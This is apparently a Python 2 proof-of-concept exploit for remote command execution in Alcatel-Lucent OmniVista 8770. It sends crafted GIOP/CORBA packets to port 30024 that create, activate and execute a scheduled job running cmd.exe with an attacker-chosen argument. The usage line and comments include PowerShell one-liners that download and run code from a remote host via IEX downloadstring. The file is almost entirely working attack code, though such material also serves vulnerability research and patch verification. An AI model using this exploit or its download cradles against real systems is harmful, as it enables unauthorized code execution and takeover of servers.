import socket
import time
import sys
import os

# ref https://blog.malerisch.net/
# Omnivista Alcatel-Lucent running on Windows Server


if len(sys.argv) < 2:
    print "Usage: %s <target> <command>" % sys.argv[0]
    print "eg: %s 192.168.1.246 \"powershell.exe -nop -w hidden -c \$g=new-object net.webclient;IEX \$g.downloadstring('http://192.168.1.40:8080/hello');\"" % sys.argv[0]
    sys.exit(1)

target = sys.argv[1]
argument1 = ' '.join(sys.argv[2:])

# so we need to get the biosname of the target... so run this poc exploit script should be run in kali directly...

netbiosname = os.popen("nbtscan -s : "+target+" | cut -d ':' -f2").read()
netbiosname = netbiosname.strip("\n")

# dirty functions to do hex magic with bytes...
### each variable has size byte before, which includes the string + "\x00" a NULL byte
### needs to calculate for each
### 

def calcsize(giop):

	s = len(giop.decode('hex'))
	h = hex(s) #"\x04" -> "04"
	return h[2:].zfill(8) # it's 4 bytes for the size

def calcstring(param): # 1 byte size calc
	
	s = (len(param)/2)+1
	h = hex(s)
	return h[2:].zfill(2) # assuming it is only 1 byte , again it's dirty...

def calcstring2(param):

	s = (len(param)/2)+1
	h = hex(s)
	return h[2:].zfill(4)



##

#GIOP request size is specified at the 11th byte

# 0000   47 49 4f 50 01 00 00 00 00 00 00 d8 00 00 00 00  GIOP............
# d8 is the size of GIOP REQUEST

# GIOP HEADER Is 12 bytes -
# GIOP REQUEST PAYLOAD comes after and it's defined at the 11th byte



#phase 1 - add a jobset

giopid = 1 # an arbitrary ID can be put there...

# there are checks in the size of the username.. need to find where the size is specified - anyway, 58 bytes seems all right...

usernamedata = "xxx.y.zzzzz,cn=Administrators,cn=8770 administration,o=nmc".encode('hex') # original "383737302061646d696e697374726174696f6e2c6f3d6e6d63"

#print "Size of usernamedata" + str(len(usernamedata.decode('hex')))

jobname = "MYJOB01".encode('hex') # size of 7 bytes # check also in the captured packet...


addjobset = "47494f50010000000000012600000000" + "00000001" + "01000000000000135363686564756c6572496e7465726661636500000000000a4164644a6f625365740000000000000000000008" + jobname + 
"00000007e0000000060000001b00000010000000240000000000000000000000000000000000000000000000000000000000000000002a0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000083131313131313100010000000000000000000000000000010000000000000000000000000000003f7569643d" 
+ usernamedata + "00000000000a6f6d6e69766973626200" # this last part can be changed???

print "Alcatel Lucent Omnivista 8770 2.0, 2.6 and 3.0 - RCE via GIOP/CORBA - @malerisch"
print "Connecting to target..."




p = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
p.connect((target, 30024))


#p = remote(target, 30024, "ipv4", "tcp")

print "Adding a job..."

p.send(addjobset.decode('hex'))

#p.recv()

data = p.recv(1024)

s = len(data)

#objectkey = "" # last 16 bytes of the response!

objectkey = data[s-16:s].encode('hex')

#print objectkey

# phase 2 - active jobset

print "Sending active packet against the job"

activegiopid = 2
active = "47494f50010000000000003100000000" + "00000002" + "0100000000000010" + objectkey +  "0000000741637469766500000000000000"

#print active

p.send(active.decode('hex'))

data2 = p.recv(1024)

#print data2

# phase3 add task

addjobid = 3

print "Adding a task...."

taskname = "BBBBBBB".encode('hex')
servername = netbiosname.encode('hex')
command = "C:\Windows\System32\cmd.exe".encode('hex') #on 32bit
#command = "C:\Windows\SysWOW64\cmd.exe".encode('hex') #on 64bit
commandsize = hex((len(command.decode('hex'))+1))
commandsize = str(commandsize).replace("0x","")

#print "Command size: "+ str(commandsize)

#print command.decode('hex')

#time.sleep(10)

#powershell = str(command)
#powershell = "powershell.exe -nop -c $J=new-object net.webclient;IEX $J.downloadstring('http://192.168.1.40:8080/hello');"

#-nop -w hidden -c $J=new-object net.webclient;$J.proxy=[Net.WebRequest]::GetSystemWebProxy();$J.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX 
$J.downloadstring('http://10.190.127.154:8080/');

#-nop -w hidden -c $J=new-object net.webclient;$J.proxy=[Net.WebRequest]::GetSystemWebProxy();$J.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX 
$J.downloadstring('http://10.190.127.154:8080/');

argument = str("/c "+argument1).encode('hex')
#argument = str("/c notepad.exe").encode('hex')

#print len(argument.decode('hex'))

#argumentsize = len(str("/c "+powershell))+1

#print "Argument size: "+str(argumentsize)

argumentsize = calcstring2(argument)

#print "argument size: "+str(argumentsize)

#print argument.decode('hex')

def calcpadd(giop):
	defaultpadding = "00000000000001"
	check = giop + defaultpadding + fixedpadding
	s = len(check)
	#print "Size: "+str(s)
	if (s/2) % 4 == 0:
		#print "size ok!"
		return check
	else:
		# fix the default padding
		#print "Size not ok, recalculating padd..."
		dif = (s/2) % 4
		#print "diff: "+str(dif)
		newpadding = defaultpadding[dif*2:]
		#print "Newpadding: " +str(newpadding)
		return giop + newpadding + fixedpadding




addjobhdr = "47494f5001000000" # 8 bytes + 4 bytes for message size, including size of the giop request message

fixedpadding = "000000000000000100000000000000010000000000000002000000000000000000000000000000000000000f0000000000000000000000000000000000000002000000000000000000000000"

variablepadding = "000000000001"

#print calcstring(servername)
#print calcstring(taskname)

#print "Command:" +str(command)
#print "command size:"+str(commandsize)

addjob = "00000000000000b30100000000000010" + objectkey + "000000074164644a6f62000000000000000000" + calcstring(taskname) + taskname + "0000000001000000"+ commandsize + command  
+"00000000" + calcstring(servername) + servername + "000000" + argumentsize + argument + "00"

#print addjob

addjobfin = calcpadd(addjob)

#print addjobfin.decode('hex')

addjobsize = calcsize(addjobfin)

#print "Lenght of the addjob: "+str(len(addjobfin.decode('hex')))

# we need to add the header

finalmsg = addjobhdr + addjobsize + addjobfin


p.send(finalmsg.decode('hex'))

data3 = p.recv(1024)

#print data3

# phase4 - execute task

executeid = 4

print "Executing task..."

execute = "47494f50010000000000003500000000000001100100000000000010" + objectkey + "0000000b457865637574654e6f7700000000000000"

p.send(execute.decode('hex'))

data4 = p.recv(1024)

print "All packets sent..."
print "Exploit sequence completed, command should have been executed...:-)"

p.close()

# optional requests to remove the job after the exploitation

### in metasploit, we should migrate to another process and then call an "abort" function of Omnivista

##phase5 - abort the job

canceljob = "47494f500100000000000030000000000000008e0100000000000010" + objectkey + "0000000743616e63656c000000000000"

###phase6 - delete the jobset 

deletejob = "47494f500100000000000038000000000000009e0100000000000010" + objectkey + "0000000d44656c6574654a6f625365740000000000000000"	

